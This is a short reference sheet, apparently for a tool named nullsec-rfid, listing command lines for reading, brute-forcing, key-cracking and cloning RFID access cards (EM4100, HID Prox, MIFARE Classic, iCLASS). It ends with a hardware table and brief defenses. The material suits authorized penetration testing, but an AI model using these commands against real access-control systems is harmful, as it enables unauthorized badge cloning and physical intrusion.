# NullSec RFID Attack Reference

## Low Frequency (125 kHz)

### EM4100/EM4102 (Read-Only)
```bash
# Read card
nullsec-rfid --read --type em4100

# Clone to T5577
nullsec-rfid --clone --source em4100 --dest t5577 --id A1B2C3D4E5
```

### HID Prox
```bash
# Read HID card
nullsec-rfid --read --type hid

# Brute force facility codes
nullsec-rfid --bruteforce --type hid --facility 1-255 --card 1-65535

# Clone to T5577
nullsec-rfid --clone --type hid --facility 123 --card 45678
```

### AWID
```bash
nullsec-rfid --read --type awid
nullsec-rfid --clone --type awid --facility 50 --card 12345
```

## High Frequency (13.56 MHz)

### MIFARE Classic
```bash
# Read card UID
nullsec-rfid --read --type mifare

# Nested attack (key recovery)
nullsec-rfid --attack nested --type mifare --known-key FFFFFFFFFFFF

# Hardnested attack
nullsec-rfid --attack hardnested --type mifare

# Dump all sectors
nullsec-rfid --dump --type mifare --keys keys.dic -o dump.bin

# Clone to magic card
nullsec-rfid --clone --type mifare --source dump.bin
```

### MIFARE DESFire
```bash
# Read application IDs
nullsec-rfid --read --type desfire --apps

# Key diversification attack
nullsec-rfid --attack diversify --type desfire
```

### iCLASS
```bash
# Read card
nullsec-rfid --read --type iclass

# Loclass attack
nullsec-rfid --attack loclass --type iclass

# Clone to iCLASS SE
nullsec-rfid --clone --type iclass --source dump.bin
```

## Hardware Support

| Device | LF | HF | TX |
|--------|----|----|-----|
| Proxmark3 Easy | ✓ | ✓ | ✓ |
| Proxmark3 RDV4 | ✓ | ✓ | ✓ |
| ACR122U | ✗ | ✓ | ✗ |
| ChameleonMini | ✗ | ✓ | ✓ |
| Flipper Zero | ✓ | ✓ | ✓ |

## Defense Recommendations
- Use encrypted credentials (DESFire, SEOS)
- Implement anti-cloning measures
- Monitor for replay attacks
- Use multi-factor authentication
